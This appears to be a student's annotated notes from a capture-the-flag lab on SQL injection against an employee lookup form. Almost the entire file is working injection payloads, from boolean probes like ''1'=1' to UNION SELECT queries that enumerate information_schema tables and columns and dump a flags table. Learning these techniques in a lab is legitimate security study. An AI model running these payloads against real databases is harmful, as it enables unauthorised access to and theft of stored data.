-- SQL format is like below, where the '?' are unknowns that we need to find.
SELECT ? FROM ? WHERE ? LIKE '%employees%'
-- To determine if a form field is open for an SQL injection, use the following to flush out some data
'1'=1
-- can also use logical operators to flush out more employee data
1 OR employee_number>0
-- once we have an output, we can attach (or combine) a query after the known entry point (1) to create a  union attack with another query
1 UNION SELECT table_name, 0, 0 FROM information_schema.tables
-- in the above case we have to have 3 arguements after SELECT as we know the format of the DB output is 3 columns (in this example it was employee no., first, and last name)
-- Using the information_schema on the MySQL website (if this website is using MySQL - there are other DBs that use SQL) to determine the format of the query string
1 UNION SELECT table_name, column_name, 0 FROM information_schema.columns
-- finally we can output our flag table that we discovered from the information_schema interrogation
1 UNION SELECT flag, flag_number, 0 FROM flags
